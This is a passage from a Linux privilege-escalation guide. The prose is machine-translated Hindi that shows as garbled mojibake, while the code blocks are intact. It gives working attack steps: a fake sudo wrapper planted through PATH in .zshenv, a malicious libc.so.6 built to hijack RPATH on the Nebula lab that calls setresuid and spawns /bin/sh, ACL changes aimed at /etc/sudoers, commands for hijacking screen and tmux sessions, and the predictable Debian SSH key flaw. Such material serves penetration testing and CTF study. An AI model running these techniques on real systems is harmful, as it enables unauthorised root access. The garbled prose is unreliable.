рдпрд╛ рдХреБрдЫ рдРрд╕рд╛ рдЪрд▓рд╛рдирд╛:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo тАШexport PATH=/tmp:$PATHтАЩ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

рдлрд╛рдЗрд▓ `/etc/ld.so.conf` **рдпрд╣ рджрд░реНрд╢рд╛рддреА рд╣реИ рдХрд┐ рд▓реЛрдб рдХреА рдЧрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдХрд╣рд╛рдБ рд╕реЗ рд╣реИрдВ**ред рдЖрдорддреМрд░ рдкрд░, рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрде рд╣реЛрддрд╛ рд╣реИ: `include /etc/ld.so.conf.d/*.conf`

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ `/etc/ld.so.conf.d/*.conf` рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реА рдЬрд╛рдПрдБрдЧреАред рдпреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ **рдЕрдиреНрдп рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддреА рд╣реИрдВ** рдЬрд╣рд╛рдБ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдХреЗ рд▓рд┐рдП **рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреА**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `/etc/ld.so.conf.d/libc.conf` рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реИ `/usr/local/lib`ред **рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо `/usr/local/lib` рдХреЗ рдЕрдВрджрд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░реЗрдЧрд╛**ред

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ** рдХрд┐рд╕реА рднреА рдкрде рдкрд░ рдЬреЛ рд╕рдВрдХреЗрддрд┐рдд рд╣реИрдВ: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ `/etc/ld.so.conf.d/*.conf` рдХреЗ рдЕрдВрджрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рдХреЛрдИ рднреА рдлрд╝реЛрд▓реНрдбрд░, рддреЛ рд╡рд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ **рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рддрд░реАрдХреЗ** рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВ:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` рдореЗрдВ lib рдХреЛ рдХреЙрдкреА рдХрд░рдХреЗ, рдЗрд╕реЗ `RPATH` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдерд╛рди рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
рдлрд┐рд░ `/var/tmp` рдореЗрдВ рдПрдХ рдмреБрд░реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдмрдирд╛рдПрдВ `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## рдХреНрд╖рдорддрд╛рдПрдБ

Linux рдХреНрд╖рдорддрд╛рдПрдБ рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрдкрд▓рдмреНрдз рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЙрдкрд╕рдореБрдЪреНрдЪрдп** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред рдпрд╣ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рд░реВрдЯ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЫреЛрдЯреЗ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд** рдХрд░рддрд╛ рд╣реИред рдЗрдирдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдЗрдХрд╛рдИ рдХреЛ рдлрд┐рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ рд╕реМрдВрдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣ рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рд╕реЗрдЯ рдХрдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╢реЛрд╖рдг рдХреЗ рдЬреЛрдЦрд┐рдо рдХрдо рд╣реЛрддреЗ рд╣реИрдВред\
рдХреНрд╖рдорддрд╛рдУрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрдврд╝реЗрдВ**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ, **"рдирд┐рд╖реНрдкрд╛рджрди" рдХреЗ рд▓рд┐рдП рдмрд┐рдЯ** рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "**cd**" рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**"рдкрдврд╝рдиреЗ"** рдХрд╛ рдмрд┐рдЯ рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдлрд╛рдЗрд▓реЛрдВ** рдХреА **рд╕реВрдЪреА** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **"рд▓рд┐рдЦрдиреЗ"** рдХрд╛ рдмрд┐рдЯ рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдлрд╛рдЗрд▓реЛрдВ** рдХреЛ **рд╣рдЯрд╛** рдФрд░ **рдирдпрд╛** **рдлрд╛рдЗрд▓** **рдмрдирд╛** рд╕рдХрддрд╛ рд╣реИред

## ACLs

рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рд▓рд┐рд╕реНрдЯ (ACLs) рд╡рд┐рд╡реЗрдХрд╛рдзреАрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рджреНрд╡рд┐рддреАрдпрдХ рдкрд░рдд рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддреА рд╣реИрдВ, рдЬреЛ **рдкрд╛рд░рдВрдкрд░рд┐рдХ ugo/rwx рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдПрдХреНрд╕реЗрд╕ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рдмрдврд╝рд╛рддреА рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдпрд╛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░, рдЬреЛ рдорд╛рд▓рд┐рдХ рдпрд╛ рд╕рдореВрд╣ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд╣реАрдВ рд╣реЛрддреЗред рдпрд╣ рд╕реНрддрд░ рдХреА **рд╕реВрдХреНрд╖реНрдорддрд╛ рдЕрдзрд┐рдХ рд╕рдЯреАрдХ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рдмрдВрдзрди рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ**ред рдЖрдЧреЗ рдХреА рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ**](https://linuxconfig.org/how-to-manage-acls-on-linux) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "kali" рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдВ:**
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**рд╡рд┐рд╢рд┐рд╖реНрдЯ ACLs** рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

In **рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдореЗрдВ рдЖрдк **рд╣рд╛рдЗрдЬреИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреБрдЫ **рд╢реЗрд▓** рд╕рддреНрд░ рдХрд╛ рдПрдХ рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рд░реВрдЯ**).\
In **рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдореЗрдВ рдЖрдк рдХреЗрд╡рд▓ **рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд╕реНрдХреНрд░реАрди рд╕рддреНрд░реЛрдВ рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЖрдк **рд╕рддреНрд░ рдХреЗ рдЕрдВрджрд░ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### screen sessions hijacking

**рд╕реНрдХреНрд░реАрди рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**рд╕рддреНрд░ рд╕реЗ рдЬреБрдбрд╝реЗрдВ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux рд╕рддреНрд░реЛрдВ рдХрд╛ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрд╣ **рдкреБрд░рд╛рдиреЗ tmux рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдорд╕реНрдпрд╛ рдереАред рдореИрдВ рдПрдХ рдЧреИрд░-рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП tmux (v2.1) рд╕рддреНрд░ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рдерд╛ред

**tmux рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**рд╕рддреНрд░ рд╕реЗ рдЬреБрдбрд╝реЗрдВ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

рд╕рднреА SSL рдФрд░ SSH рдХреБрдВрдЬреА рдЬреЛ Debian рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдо (Ubuntu, Kubuntu, рдЖрджрд┐) рдкрд░ рд╕рд┐рддрдВрдмрд░ 2006 рдФрд░ 13 рдордИ 2008 рдХреЗ рдмреАрдЪ рдЙрддреНрдкрдиреНрди рдХреА рдЧрдИ рдереАрдВ, рдЗрд╕ рдмрдЧ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред\
рдпрд╣ рдмрдЧ рдЙрди OS рдореЗрдВ рдПрдХ рдирдИ ssh рдХреБрдВрдЬреА рдмрдирд╛рдиреЗ рдХреЗ рджреМрд░рд╛рди рд╣реЛрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ **рдХреЗрд╡рд▓ 32,768 рднрд┐рдиреНрдирддрд╛рдПрдБ рд╕рдВрднрд╡ рдереАрдВ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рднреА рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдФрд░ **ssh рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╣реЛрдиреЗ рдкрд░ рдЖрдк рд╕рдВрдмрдВрдзрд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЖрдк рдпрд╣рд╛рдБ рдЧрдгрдирд╛ рдХреА рдЧрдИ рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

* **PasswordAuthentication:** рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ `no` рд╣реИред
* **PubkeyAuthentication:** рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ `yes` рд╣реИред
* **PermitEmptyPasswords**: рдЬрдм рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рдЦрд╛рд▓реА рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡рд╛рд▓реЗ рдЦрд╛рддреЛрдВ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ `no` рд╣реИред

### PermitRootLogin

рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд░реВрдЯ ssh рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ `no` рд╣реИред рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:

* `yes`: рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `without-password` рдпрд╛ `prohibit-password`: рд░реВрдЯ рдХреЗрд╡рд▓ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `forced-commands-only`: рд░реВрдЯ рдХреЗрд╡рд▓ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдХрдорд╛рдВрдб рд╡рд┐рдХрд▓реНрдк рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВ
* `no` : рдирд╣реАрдВ

### AuthorizedKeysFile

рдпрд╣ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдЗрд╕рдореЗрдВ `%h` рдЬреИрд╕реЗ рдЯреЛрдХрди рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред **рдЖрдк рдкреВрд░реНрдг рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬреЛ `/` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ) рдпрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реЛрдо рд╕реЗ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдпрджрд┐ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "**testusername**" рдХреА **private** рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ ssh рдЖрдкрдХреА рдХреБрдВрдЬреА рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреА рддреБрд▓рдирд╛ `/home/testusername/.ssh/authorized_keys` рдФрд░ `/home/testusername/access` рдореЗрдВ рд╕реНрдерд┐рдд рдХреБрдВрдЬрд┐рдпреЛрдВ рд╕реЗ рдХрд░реЗрдЧрд╛ред

### ForwardAgent/AllowAgentForwarding

SSH рдПрдЬреЗрдВрдЯ рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдЖрдкрдХреЛ **рдЕрдкрдиреЗ рд╕реНрдерд╛рдиреАрдп SSH рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдмрдЬрд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рдкрд░ рдХреБрдВрдЬрд┐рдпрд╛рдБ (рдмрд┐рдирд╛ рдкрд╛рд╕рдлрд╝реНрд░реЗрдЬрд╝ рдХреЗ!) рдЫреЛрдбрд╝ рджреЗрдВред рдЗрд╕рд▓рд┐рдП, рдЖрдк ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдПрдХ рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЬрдВрдк** рдХрд░ рд╕рдХреЗрдВрдЧреЗ рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ **рджреВрд╕рд░реЗ** рд╣реЛрд╕реНрдЯ рдкрд░ **рдЬрдВрдк** рдХрд░ рд╕рдХреЗрдВрдЧреЗ **рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдЕрдкрдиреА **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╣реЛрд╕реНрдЯ** рдореЗрдВ рд╕реНрдерд┐рдд **рдХреБрдВрдЬреА**ред 

рдЖрдкрдХреЛ рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ `$HOME/.ssh.config` рдореЗрдВ рдЗрд╕ рддрд░рд╣ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```
Host example.com
ForwardAgent yes
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ `Host` `*` рд╣реИ, рддреЛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдорд╢реАрди рдкрд░ рдХреВрджрддрд╛ рд╣реИ, рд╡рд╣ рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдЧрд╛ (рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ)ред

рдлрд╛рдЗрд▓ `/etc/ssh_config` рдЗрд╕ **рд╡рд┐рдХрд▓реНрдкреЛрдВ** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рдпрд╛ рдЕрд╕реНрд╡реАрдХреГрддрд┐ рдХрд░ рд╕рдХрддреА рд╣реИред\
рдлрд╛рдЗрд▓ `/etc/sshd_config` ssh-agent рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдХреЛ рдХреАрд╡рд░реНрдб `AllowAgentForwarding` рдХреЗ рд╕рд╛рде **рдЕрдиреБрдорддрд┐** рдпрд╛ **рдЕрд╕реНрд╡реАрдХреГрддрд┐** рдХрд░ рд╕рдХрддреА рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЕрдиреБрдорддрд┐ рд╣реИ)ред

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдлреЙрд░рд╡рд░реНрдб рдПрдЬреЗрдВрдЯ рдХрд┐рд╕реА рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдЗрд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЗрдВ

### рдкреНрд░реЛрдлрд╛рдЗрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ

